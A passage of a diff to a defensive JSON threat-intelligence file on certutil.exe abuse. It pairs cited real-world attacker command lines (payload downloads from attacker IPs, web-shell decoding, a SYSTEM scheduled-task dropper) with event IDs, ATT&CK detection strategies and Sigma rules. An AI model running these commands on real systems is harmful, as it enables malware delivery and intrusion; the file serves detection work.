+        "intent": "A second version of the infecting document embeds a .BAT file that downloads and runs a second-stage malware (debug.exe).",
+        "status": "verified",
+        "source_name": "Trend Micro DRBControl February 2020",
+        "source_url": "https://documents.trendmicro.com/assets/white_papers/wp-uncovering-DRBcontrol.pdf"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://45.83.237[.]34:9999/server.exe C:\\Windows\\Temp\\serv.exe",
+        "intent": "In some cases the attackers used certutil.exe to download Gelsemine, the first stage of Gelsemium.",
+        "status": "verified",
+        "source_name": "ESET Gelsemium June 2021",
+        "source_url": "https://www.welivesecurity.com/wp-content/uploads/2021/06/eset_gelsemium.pdf"
+      },
+      {
+        "command": "cmd.exe /c Certutil -decode %appdata%\\Base.txt %programdata%\\IntelSecurityAssistManager.exe",
+        "intent": "A scheduled task created by the macro runs Certutil to decode the base64 data in Base.txt into IntelSecurityAssistManager.exe.",
+        "status": "verified",
+        "source_name": "Unit 42 OopsIE February 2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/02/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/"
+      },
+      {
+        "command": "certutil -decode C:\\dns.txt C:\\dns.exe",
+        "intent": "The attackers write the Base64 payload in chunks to C:\\dns.txt and launch certutil with -decode to convert it into an .exe file.",
+        "status": "verified",
+        "source_name": "Group-IB APT41 World Tour 2021",
+        "source_url": "https://www.group-ib.com/blog/apt41-world-tour-2021/"
+      },
+      {
+        "command": "certutil -hashfile C:\\dns.exe",
+        "intent": "After decoding the payload, the attackers launch certutil again with -hashfile, then copy and move the decoded dns.exe.",
+        "status": "verified",
+        "source_name": "Group-IB APT41 World Tour 2021",
+        "source_url": "https://www.group-ib.com/blog/apt41-world-tour-2021/"
+      },
+      {
+        "command": "\"C:\\Windows\\system32\\certutil.exe\" -hashfile \"[REDACTED].txt\" MD5",
+        "intent": "GammaSteel uses certutil.exe to get the MD5 of the exfiltrated file and possibly store it as a file.",
+        "status": "verified",
+        "source_name": "Symantec Shuckworm GammaSteel April 2025",
+        "source_url": "https://www.security.com/threat-intelligence/shuckworm-ukraine-gammasteel"
+      },
+      {
+        "command": "\"cmd.exe\" /c certutil -decode %USERPROFILE%\\AppData\\bigfile.txt %USERPROFILE%\\AppData\\bigfile.exe",
+        "intent": "The threat actors echoed base64 data into bigfile.txt over xp_cmdshell and used certutil to decode it into a privilege escalation executable.",
+        "status": "verified",
+        "source_name": "The DFIR Report SELECT XMRig FROM SQLServer July 2022",
+        "source_url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
+      },
+      {
+        "command": "cmd /c certutil -urlcache -split -f hxxp://38[.]54[.]94[.]13:8080/86.dat c:\\users\\public\\public.dat",
+        "intent": "The win.bat batch file downloads and executes the SparkRAT malware by abusing certutil.",
+        "status": "verified",
+        "source_name": "Trend Micro TeamCity Jasmin Ransomware March 2024",
+        "source_url": "https://www.trendmicro.com/en_us/research/24/c/teamcity-vulnerability-exploits-lead-to-jasmin-ransomware.html"
+      },
+      {
+        "command": "certutil -urlcache -f https://<HOST>/AkelPad.rar $public\\libraries\\AkelPad.rar",
+        "intent": "The attackers try to download AdaptixC2 from several URLs using bitsadmin, curl, certutil and PowerShell.",
+        "status": "verified",
+        "source_name": "Kaspersky Tomiris New Tools November 2025",
+        "source_url": "https://securelist.com/tomiris-new-tools/118143/"
+      },
+      {
+        "command": "C: && cd %TEMP% && c^e^r^tutil -urlca^che -spl^it -f https://881.000webhostapp[.]com/1.txt && ren 1.txt 1.bat && 1.bat && exit",
+        "intent": "After the decoy document opens, this obfuscated command downloads and executes a remote file via the built-in certutil utility.",
+        "status": "verified",
+        "source_name": "Unit 42 CARROTBAT November 2018",
+        "source_url": "https://unit42.paloaltonetworks.com/unit42-the-fractured-block-campaign-carrotbat-malware-used-to-deliver-malware-targeting-southeast-asia/"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://s8877.1apps[.]com/vip/setup.txt > nul",
+        "intent": "The retrieved script checks the operating system and downloads the payload again with certutil; the payload is base64 that certutil decodes into a CAB file.",
+        "status": "verified",
+        "source_name": "Unit 42 CARROTBAT November 2018",
+        "source_url": "https://unit42.paloaltonetworks.com/unit42-the-fractured-block-campaign-carrotbat-malware-used-to-deliver-malware-targeting-southeast-asia/"
+      },
+      {
+        "command": "certutil -decode -f setup.txt setup.cab > nul",
+        "intent": "In the retrieved script, the downloaded base64 payload is decoded by certutil into a CAB file that is then unpacked.",
+        "status": "verified",
+        "source_name": "Unit 42 CARROTBAT November 2018",
+        "source_url": "https://unit42.paloaltonetworks.com/unit42-the-fractured-block-campaign-carrotbat-malware-used-to-deliver-malware-targeting-southeast-asia/"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://23[.]26[.]137[.]225:8084/msappdata.msi c:\\mpyutd.msi",
+        "intent": "The Bl00dy ransomware group used this command to download and execute their ransomware payload after exploiting ScreenConnect.",
+        "status": "verified",
+        "source_name": "Trend Micro ScreenConnect Exploitation February 2024",
+        "source_url": "https://www.trendmicro.com/en_us/research/24/b/threat-actor-groups-including-black-basta-are-exploiting-recent-.html"
+      },
+      {
+        "command": "schtasks /create /RL HIGHEST /RU \"NT AUTHORITY\\SYSTEM\" /sc minute /mo 30 /tn \"schdsWin\" /tr \"cmd.exe /C certutil.exe -urlcache -f http://192.169.6.122:6770/svchost.exe %systemdrive%\\\\Windows\\\\Temp\\\\svchost.exe & %systemdrive%\\\\Windows\\\\Temp\\\\svchost.exe\"",
+        "intent": "During a meterpreter session the threat actor created a scheduled task that downloads and launches a payload as NT AUTHORITY\\SYSTEM.",
+        "status": "verified",
+        "source_name": "The DFIR Report Lets Open(Dir) Some Presents December 2023",
+        "source_url": "https://thedfirreport.com/2023/12/18/lets-opendir-some-presents-an-analysis-of-a-persistent-actors-activity/"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 powershellintelmodule.ps1",
+        "intent": "The threat actor used certutil to download PowerView to run discovery commands.",
+        "status": "verified",
+        "source_name": "The DFIR Report Lets Open(Dir) Some Presents December 2023",
+        "source_url": "https://thedfirreport.com/2023/12/18/lets-opendir-some-presents-an-analysis-of-a-persistent-actors-activity/"
+      },
+      {
+        "command": "aa.exe 10.20.11.11 -u -p --local-auth -x \"certutil.exe -urlcache -split -f http[:]//95.181.161[.]81:443/l.exe C:\\programdata\\l.exe\"",
+        "intent": "UNC3313 used CrackMapExec to run certutil remotely to download the LIGOLO tunneler.",
+        "status": "verified",
+        "source_name": "Mandiant Left on Read Telegram Malware February 2022",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/telegram-malware-iranian-espionage"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f hxxp://95.181.161[.]81:443/per_indexx.exe",
+        "intent": "The STARWHALE.GO malware was downloaded onto the system using the certutil.exe utility.",
+        "status": "verified",
+        "source_name": "Mandiant Left on Read Telegram Malware February 2022",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/telegram-malware-iranian-espionage"
+      },
+      {
+        "command": "\"C:\\Windows\\system32\\cmd.exe\" /c certutil -urlcache -split -f \\ ht\"\"\"\"tp://206.237.3[.]150:443/1.txt \\ C:\\users\\public\\downloads\\msvcp140.dll",
+        "intent": "The adversary downloaded the malicious msvcp140.dll used to side-load Cobalt Strike with certutil.exe.",
+        "status": "verified",
+        "source_name": "Elastic Security Labs REF0657 January 2024",
+        "source_url": "https://www.elastic.co/security-labs/threat-command/unmasking-financial-services-intrusion-ref0657"
+      },
+      {
+        "command": "\"C:\\Windows\\system32\\cmd.exe\" /c certutil -urlcache -split -f \\ ht\"\"\"\"tp://206.237.3[.]150:443/megacmd.exe \\ C:\\users\\public\\downloads\\ms_edge.exe",
+        "intent": "While leveraging MSSQL, the adversary downloaded MEGA Cmd with certutil and renamed it ms_edge.exe.",
+        "status": "verified",
+        "source_name": "Elastic Security Labs REF0657 January 2024",
+        "source_url": "https://www.elastic.co/security-labs/threat-command/unmasking-financial-services-intrusion-ref0657"
+      },
+      {
+        "command": "certutil -f -decode C:\\Programdata\\1.txt C:\\ProgramData\\<REDACTED>.exe",
+        "intent": "The adversary used Certutil commands to decode and execute binaries via a batch script.",
+        "status": "verified",
+        "source_name": "CrowdStrike Four Popular Defensive Evasion Techniques September 2021",
+        "source_url": "https://www.crowdstrike.com/en-us/blog/four-popular-defensive-evasion-techniques-in-2021/"
+      },
+      {
+        "command": "certutil -f -decode C:\\Programdata\\2.txt C:\\ProgramData\\<REDACTED>.dll",
+        "intent": "The adversary used Certutil commands to decode and execute binaries (here a DLL for a PlugX implant) via a batch script.",
+        "status": "verified",
+        "source_name": "CrowdStrike Four Popular Defensive Evasion Techniques September 2021",
+        "source_url": "https://www.crowdstrike.com/en-us/blog/four-popular-defensive-evasion-techniques-in-2021/"
+      },
+      {
+        "command": "certutil -decode -f C:\\Windows\\Temp\\ImportContactList_-.aspx C:\\Windows\\Temp\\ImportContactList.aspx",
+        "intent": "A Base64-encoded PowerShell command run via an Exchange-related process executed certutil to decode and install a web shell.",
+        "status": "verified",
+        "source_name": "Symantec Grayfly Sidewalk September 2021",
+        "source_url": "https://www.security.com/threat-intelligence/grayfly-china-sidewalk-malware"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f hxxp://<Public IP>/conhost.exe",
+        "intent": "A service masquerading as conhost.exe (SoftEther VPN) was downloaded using certutil and installed as a system service.",
+        "status": "verified",
+        "source_name": "Kaspersky Incident Response Cases 2023 September 2024",
+        "source_url": "https://securelist.com/incident-response-interesting-cases-2023/113611/"
+      },
+      {
+        "command": "certutil -decode c:\\programdata\\cmd.txt C:\\Program Files\\Common Files\\microsoft shared\\Web Server Extensions\\14\\TEMPLATE\\LAYOUTS\\c.aspx",
+        "intent": "The command echoes base64 data to cmd.txt and uses certutil to convert it to the c.aspx web shell in SharePoint folders.",
+        "status": "verified",
+        "source_name": "Unit 42 SharePoint CVE-2019-0604 February 2020",
+        "source_url": "https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/"
+      },
+      {
+        "command": "certutil -decode c:\\programdata\\a.txt c:\\program files\\common files\\microsoft shared\\web server extensions\\14\\template\\layouts\\bitreeview.aspx",
+        "intent": "The actor again uses certutil to decode a base64 file into the bitreeview.aspx web shell.",
+        "status": "verified",
+        "source_name": "Unit 42 SharePoint CVE-2019-0604 February 2020",
+        "source_url": "https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/"
+      },
+      {
+        "command": "certutil -urlcache -split -f hxxps[:]//temp[.]sh/esuJB/resident[.]exe C:\\programdata\\res.exe",
+        "intent": "Talos observed native Windows binaries like certutil.exe used to retrieve and execute the Resident backdoor.",
+        "status": "verified",
+        "source_name": "Cisco Talos TA866 Asylum Ambuscade October 2024",
+        "source_url": "https://blog.talosintelligence.com/highlighting-ta866-asylum-ambuscade/"
+      },
+      {
+        "command": "certutil -decode C:\\users\\%ASD%\\tmp.txt C:\\programdata\\0C137A80.tmp",
+        "intent": "The threat actor exploited the WSUS vulnerability to execute curl.exe and certutil.exe to install ShadowPad.",
+        "status": "verified",
+        "source_name": "AhnLab ASEC ShadowPad WSUS CVE-2025-59287 November 2025",
+        "source_url": "https://asec.ahnlab.com/en/91166/"
+      },
+      {
+        "command": "start /MIN certutil -decode “%USERPROFILE%\\Links\\Document.dat” “%USERPROFILE%\\Links\\Document.vbs”",
+        "intent": "The command executed from the CHM saves an encoded command to Document.dat and decodes it with certutil into Document.vbs, then adds a Run key.",
+        "status": "verified",
+        "source_name": "AhnLab ASEC Kimsuky CHM Questionnaire 2022",
+        "source_url": "https://asec.ahnlab.com/en/49295/"
+      },
+      {
+        "command": "certutil -decode %appdata%\\vUCooUr1 %appdata%\\vUCooUr.exe",
+        "intent": "The macro-built command downloads encoded content with finger.exe and decodes it with the legitimate Windows utility certutil.exe before executing it.",
+        "status": "verified",
+        "source_name": "Zscaler MINEBRIDGE RAT February 2021",
+        "source_url": "https://www.zscaler.com/blogs/security-research/return-minebridge-rat-new-ttps-and-social-engineering-lures"
+      }
+    ]
+  },
+  "detections": {
+    "event_ids": {
+      "WinEventLog:Security": [
+        {
+          "event_id": 4657,
+          "data_components": [
+            "Windows Registry Key Modification"
+          ],
+          "techniques": [
+            "T1553.004"
+          ]
+        },
+        {
+          "event_id": 4688,
+          "data_components": [
+            "Process Creation"
+          ],
+          "techniques": [
+            "T1560.001"
+          ]
+        }
+      ],
+      "WinEventLog:Sysmon": [
+        {
+          "event_id": 1,
+          "data_components": [
+            "Process Creation"
+          ],
+          "techniques": [
+            "T1140",
+            "T1105",
+            "T1553.004"
+          ]
+        },
+        {
+          "event_id": 3,
+          "data_components": [
+            "Network Connection Creation"
+          ],
+          "techniques": [
+            "T1105"
+          ]
+        },
+        {
+          "event_id": 7,
+          "data_components": [
+            "Module Load"
+          ],
+          "techniques": [
+            "T1560.001"
+          ]
+        },
+        {
+          "event_id": 10,
+          "data_components": [
+            "Process Access"
+          ],
+          "techniques": [
+            "T1140"
+          ]
+        },
+        {
+          "event_id": 11,
+          "data_components": [
+            "File Creation"
+          ],
+          "techniques": [
+            "T1140",
+            "T1560.001",
+            "T1105"
+          ]
+        },
+        {
+          "event_id": 12,
+          "data_components": [
+            "Windows Registry Key Creation"
+          ],
+          "techniques": [
+            "T1553.004"
+          ]
+        },
+        {
+          "event_id": 22,
+          "data_components": [
+            "Network Connection Creation"
+          ],
+          "techniques": [
+            "T1105"
+          ]
+        }
+      ]
+    },
+    "other_log_sources": [],
+    "attack_detection_strategies": [
+      {
+        "technique": "T1140",
+        "id": "DET0275",
+        "name": "Detect Adversary Deobfuscation or Decoding of Files and Payloads",
+        "url": "https://attack.mitre.org/detectionstrategies/DET0275",
+        "analytics": [
+          {
+            "id": "AN0767",
+            "description": "An adversary leverages built-in tools such as certutil.exe, powershell.exe, or copy.exe to decode, reassemble, or extract hidden malicious content from obfuscated containers or encoded formats. The decoding utility often spawns shortly after file staging or download and may be chained with script interpreters or further payload execution.",
+            "log_sources": [
+              {
+                "data_component": "Process Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=1"
+              },
+              {
+                "data_component": "File Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=11"
+              },
+              {
+                "data_component": "Process Access",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=10"
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "technique": "T1560.001",
+        "id": "DET0298",
+        "name": "Detect Archiving via Utility (T1560.001)",
+        "url": "https://attack.mitre.org/detectionstrategies/DET0298",
+        "analytics": [
+          {
+            "id": "AN0831",
+            "description": "Detects adversarial archiving using built-in or third-party utilities (makecab, diantz, xcopy, certutil, 7z, WinRAR, WinZip). Correlates suspicious process creation events with command-line arguments for compression/encoding, followed by creation of archive files (.cab, .zip, .7z, .rar). Identifies anomalous loading of crypt32.dll for encryption operations or execution of diantz.exe to compress remotely staged files.",
+            "log_sources": [
+              {
+                "data_component": "Process Creation",
+                "name": "WinEventLog:Security",
+                "channel": "EventCode=4688"
+              },
+              {
+                "data_component": "File Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=11"
+              },
+              {
+                "data_component": "Module Load",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=7"
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "technique": "T1105",
+        "id": "DET0060",
+        "name": "Detect Ingress Tool Transfers via Behavioral Chain",
+        "url": "https://attack.mitre.org/detectionstrategies/DET0060",
+        "analytics": [
+          {
+            "id": "AN0165",
+            "description": "Unusual or uncommon processes initiate network connections to external destinations followed by file creation (tools downloaded).",
+            "log_sources": [
+              {
+                "data_component": "Network Connection Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=3, 22"
+              },
+              {
+                "data_component": "File Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=11"
+              },
+              {
+                "data_component": "Process Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=1"
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "technique": "T1553.004",
+        "id": "DET0056",
+        "name": "Detection Strategy for Subvert Trust Controls via Install Root Certificate.",
+        "url": "https://attack.mitre.org/detectionstrategies/DET0056",
+        "analytics": [
+          {
+            "id": "AN0153",
+            "description": "Detection of unauthorized modifications to Windows root certificate stores by monitoring registry keys, certificate installation processes, and creation of new certificate entries not in baseline trusted lists.",
+            "log_sources": [
+              {
+                "data_component": "Windows Registry Key Modification",
+                "name": "WinEventLog:Security",
+                "channel": "EventCode=4657"
+              },
+              {
+                "data_component": "Windows Registry Key Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=12"
+              },
+              {
+                "data_component": "Process Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=1"
+              }
+            ]
+          }
+        ]
+      }
+    ],
+    "sigma_rules": [
+      {
+        "title": "Uncommon Network Connection Initiated By Certutil.EXE",
+        "id": "0dba975d-a193-4ed1-a067-424df57570d1",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/network_connection/net_connection_win_certutil_initiated_connection.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "network_connection",
+          "product": "windows"
+        },
+        "attack": [
+          "T1105"
+        ]
+      },
+      {
+        "title": "New Root Certificate Installed Via Certutil.EXE",
+        "id": "d2125259-ddea-4c1c-9c22-977eb5b29cf0",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_certutil_certificate_installation.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1553.004"
+        ]
+      },
+      {
+        "title": "File Decoded From Base64/Hex Via Certutil.EXE",
+        "id": "cc9cbe82-7bc0-4ef5-bc23-bbfb83947be7",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_certutil_decode.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1027"
+        ]
+      },
+      {
+        "title": "Suspicious Download Via Certutil.EXE",
+        "id": "19b08b1c-861d-4e75-a1ef-ea0c1baf202b",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_certutil_download.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1027",
+          "T1105"
+        ]
+      },
+      {
+        "title": "Suspicious File Downloaded From Direct IP Via Certutil.EXE",
+        "id": "13e6fe51-d478-4c7e-b0f2-6da9b400a829",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_certutil_download_direct_ip.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1027",
+          "T1105"
+        ]
+      },
+      {
+        "title": "Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE",
+        "id": "42a5f1e7-9603-4f6d-97ae-3f37d130d794",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_certutil_download_file_sharing_domains.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1027",
+          "T1105"
+        ]
+      },
+      {
+        "title": "File Encoded To Base64 Via Certutil.EXE",
+        "id": "e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_certutil_encode.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1027"
+        ]
+      },
+      {
+        "title": "Suspicious File Encoded To Base64 Via Certutil.EXE",
+        "id": "ea0cdc3e-2239-4f26-a947-4e8f8224e464",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_certutil_encode_susp_extensions.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1027"
+        ]
+      },
+      {
+        "title": "File In Suspicious Location Encoded To Base64 Via Certutil.EXE",
+        "id": "82a6714f-4899-4f16-9c1e-9a333544d4c3",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_certutil_encode_susp_location.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1027"
+        ]
+      },
+      {
+        "title": "Certificate Exported Via Certutil.EXE",
+        "id": "3ffd6f51-e6c1-47b7-94b4-c1e61d4117c5",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_certutil_export_pfx.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1027"
+        ]
+      },
+      {
+        "title": "Potential NTLM Coercion Via Certutil.EXE",
+        "id": "6c6d9280-e6d0-4b9d-80ac-254701b64916",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_certutil_ntlm_coercion.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218"
+        ]
+      },
+      {
+        "title": "Potential Atlassian Confluence CVE-2021-26084 Exploitation Attempt",
+        "id": "245f92e3-c4da-45f1-9070-bc552e06db11",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2021/Exploits/CVE-2021-26084/proc_creation_win_exploit_cve_2021_26084_atlassian_confluence.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059",
+          "T1190"
+        ]
+      },
+      {
+        "title": "Mint Sandstorm - AsperaFaspex Suspicious Process Execution",
+        "id": "91048c0d-5b81-4b85-a099-c9ee4fb87979",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/TA/Mint-Sandstorm/proc_creation_win_apt_mint_sandstorm_aspera_faspex_susp_child_process.yml",
+        "level": "critical",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Mint Sandstorm - ManageEngine Suspicious Process Execution",
+        "id": "58d8341a-5849-44cd-8ac8-8b020413a31b",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/TA/Mint-Sandstorm/proc_creation_win_apt_mint_sandstorm_manage_engine_susp_child_process.yml",
+        "level": "critical",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "PaperCut MF/NG Potential Exploitation",
+        "id": "0934ac71-a331-4e98-a034-d49c491fbbcb",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/TA/PaperCut-Print-Management-Exploitation/proc_creation_win_papercut_print_management_exploitation_pc_app.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Potential Exploitation of GoAnywhere MFT Vulnerability",
+        "id": "6c76b3d0-afe4-4870-9443-ffe6773c5fef",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2025/Exploits/CVE-2025-10035/proc_creation_win_exploit_cve_2025_10035.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001",
+          "T1133",
+          "T1190"
+        ]
+      },
+      {
+        "title": "Suspicious Child Process of SAP NetWeaver",
+        "id": "5b304bcb-ac33-49d0-87af-fa1b3ca94333",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2025/Exploits/CVE-2025-31324/proc_creation_win_sap_netweaver_susp_child_process.yml",
+        "level": "medium",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.003",
+          "T1190"
+        ]
+      },
+      {
+        "title": "Suspicious Child Process of SolarWinds WebHelpDesk",
+        "id": "8c7f4a2d-3b9e-4f1c-9a6d-2e8f5c3d9a1b",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2025/Exploits/CVE-2025-40551/proc_creation_win_exploit_cve_2025_40551.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1190"
+        ]
+      },
+      {
+        "title": "Potential Exploitation of CrushFTP RCE Vulnerability (CVE-2025-54309)",
+        "id": "0fdc7c7f-c690-4217-9ae3-31f5156eed72",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2025/Exploits/CVE-2025-54309/proc_creation_win_exploit_cve_2025_54309.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001",
+          "T1059.003",
+          "T1068",
+          "T1190"
+        ]
+      },
+      {
+        "title": "Windows Suspicious Child Process from Node.js - React2Shell",
+        "id": "271de298-cc0e-4842-acd8-079a0a99ea65",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2025/Exploits/CVE-2025-55182/proc_creation_win_exploit_cve_2025_55182_susp_nodejs_server_child_process.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "command_line",
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059",
+          "T1190"
+        ]
+      },
+      {
+        "title": "Potentially Suspicious PowerShell Child Processes",
+        "id": "e4b6d2a7-d8a4-4f19-acbd-943c16d90647",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_susp_child_processes.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001"
+        ]
+      },
+      {
+        "title": "Potential Initial Access via DLL Search Order Hijacking",
+        "id": "dbbd9f66-2ed3-4ca2-98a4-6ea985dd1a1c",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_initial_access_dll_search_order_hijacking.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "file_event"
+        },
+        "attack": [
+          "T1566",
+          "T1566.001",
+          "T1574",
+          "T1574.001"
+        ]
+      },
+      {
+        "title": "Windows Shell/Scripting Application File Write to Suspicious Folder",
